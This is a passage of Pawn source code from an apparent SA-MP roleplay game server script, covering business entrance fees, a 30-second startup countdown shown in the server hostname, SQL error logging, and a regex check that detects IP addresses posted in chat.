            SBizzInfo[i][sbTill] += SBizzInfo[i][sbEntranceCost];
            GivePlayerPool(playerid, -SBizzInfo[i][sbEntranceCost]);
            return 1;
        }
    }
	return 1;
}
stock GetDaysInMonth(month, year)
{
    switch(month)
    {
        case 1, 3, 5, 7, 8, 10, 12: return 31;
        case 4, 6, 9, 11: return 30;
        case 2: return (((!(year % 4) && (year % 100) != 0)) || !(year % 400)) ? (29) : (28);
    }
    return -1;
}

stock SetVehicleSoratLimit(veh, speed)
{
    MaxSorat[veh] = speed;
    return 1;
}

Public:SVExitKon()
{
    mysql_close(handle);
    SendRconCommand("exit");
    return 1;
}


Public:SVStart()
{
	SendRconCommand("hostname [JoKeR GaminG] Lotfan 29 Sanie Sabr konid...");
	SetTimer("SVStart2", 1000, 0);
    return 1;
}
Public:SVStart2()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 28 Sanie Sabr konid...");
	SetTimer("SVStart3", 1000, 0);
    return 1;
}
Public:SVStart3()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 27 Sanie Sabr konid...");
	SetTimer("SVStart4", 1000, 0);
    return 1;
}
Public:SVStart4()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 26 Sanie Sabr konid...");
	SetTimer("SVStart5", 1000, 0);
    return 1;
}
Public:SVStart5()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 25 Sanie Sabr konid...");
	SetTimer("SVStart6", 1000, 0);
    return 1;
}
Public:SVStart6()
{
	SendRconCommand("hostname [{FF0000JoKeR GaminG {FFFFFF}] Lotfan 24 Sanie Sabr konid...");
	SetTimer("SVStart7", 1000, 0);
    return 1;
}
Public:SVStart7()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 23 Sanie Sabr konid...");
	SetTimer("SVStart8", 1000, 0);
    return 1;
}
Public:SVStart8()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 22 Sanie Sabr konid...");
	SetTimer("SVStart9", 1000, 0);
    return 1;
}
Public:SVStart9()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 21 Sanie Sabr konid...");
	SetTimer("SVStart10", 1000, 0);
    return 1;
}
Public:SVStart10()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 20 Sanie Sabr konid...");
	SetTimer("SVStart11", 1000, 0);
    return 1;
}
Public:SVStart11()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 19 Sanie Sabr konid...");
	SetTimer("SVStart12", 1000, 0);
    return 1;
}
Public:SVStart12()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 18 Sanie Sabr konid...");
	SetTimer("SVStart13", 1000, 0);
    return 1;
}
Public:SVStart13()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 17 Sanie Sabr konid...");
	SetTimer("SVStart14", 1000, 0);
    return 1;
}
Public:SVStart14()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 16 Sanie Sabr konid...");
	SetTimer("SVStart16", 1000, 0);
    return 1;
}
Public:SVStart15()
{
	SendRconCommand("hostname {57e547}JoKeR GaminG {FFFFFF}: RPG SerVeR [0.3.7] (IRRS)");
	SendRconCommand("password 0");

    return 1;
}

Public:SVStart16()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 15 Sanie Sabr konid...");
	SetTimer("SVStart17", 1000, 0);
    return 1;
}
Public:SVStart17()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 14 Sanie Sabr konid...");
	SetTimer("SVStart18", 1000, 0);
    return 1;
}Public:SVStart18()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 13 Sanie Sabr konid...");
	SetTimer("SVStart19", 1000, 0);
    return 1;
}Public:SVStart19()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 12 Sanie Sabr konid...");
	SetTimer("SVStart20", 1000, 0);
    return 1;
}Public:SVStart20()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 11 Sanie Sabr konid...");
	SetTimer("SVStart21", 1000, 0);
    return 1;
}Public:SVStart21()
{
	SendRconCommand("hostname [{57e547}JoKeR GaminG {FFFFFF}] Lotfan 10 Sanie Sabr konid...");
	SetTimer("SVStart22", 1000, 0);
    return 1;
}Public:SVStart22()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 9 Sanie Sabr konid...");
	SetTimer("SVStart23", 1000, 0);
    return 1;
}Public:SVStart23()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 8 Sanie Sabr konid...");
	SetTimer("SVStart24", 1000, 0);
    return 1;
}Public:SVStart24()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 7 Sanie Sabr konid...");
	SetTimer("SVStart25", 1000, 0);
    return 1;
}Public:SVStart25()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 6 Sanie Sabr konid...");
	SetTimer("SVStart26", 1000, 0);
    return 1;
}Public:SVStart26()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}{57e547} {FFFFFF}] Lotfan 5 Sanie Sabr konid...");
	SetTimer("SVStart27", 1000, 0);
    return 1;
}Public:SVStart27()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 4 Sanie Sabr konid...");
	SetTimer("SVStart28", 1000, 0);
    return 1;
}
Public:SVStart28()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 3 Sanie Sabr konid...");
	SetTimer("SVStart29", 1000, 0);
    return 1;
}Public:SVStart29()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 2 Sanie Sabr konid...");
	SetTimer("SVStart30", 1000, 0);
    return 1;
}Public:SVStart30()
{
	SendRconCommand("hostname [{57e547} {FFFFFF}] Lotfan 1 Sanie Sabr konid...");
	SetTimer("SVStart15", 1000, 0);
    return 1;
}
public OnQueryError(errorid, error[], callback[], query[], connectionHandle)
{
    new File:sqlErrorFile = fopen("sqlerror.txt", io_write);
    new string[1000];
    format(string, 1000, "\n\n\nError( %i ): %s, at: %s, Query was be: %s", errorid, error, callback, query);
    fwrite(sqlErrorFile, string);
    fclose(sqlErrorFile);
    return 1;
}
stock PlayerName(playerid)
{
	new PlayerEsm[MAX_PLAYER_NAME];
	GetPlayerName(playerid,PlayerEsm,sizeof(PlayerEsm));
	return PlayerEsm;
}
stock IsTabligh(text[])
{
    new message[128], build, expression[] = "(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.+){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)", start, end;
    strcpyy(message, text, sizeof(message));

    for(new i = 0, j = strlen(message); i < j; i ++)
    {
        switch(message[i])
        {
            case '0'..'9': continue;
            default:
            {
                strdel(message, i, i + 1);
                strins(message, ".", i);
            }
        }
    }

    build = regex_exbuild(expression);
    regex_exmatch(message, build);
    regex_exsearch(message, build, start, end);

    if(start >= 0) return true;
    return false;
}
stock CLS(playerid)
{
for(new i=0;i<100;i++)
	{
	SendClientMessage(playerid, -1, " ");
	}
	return 1;
}
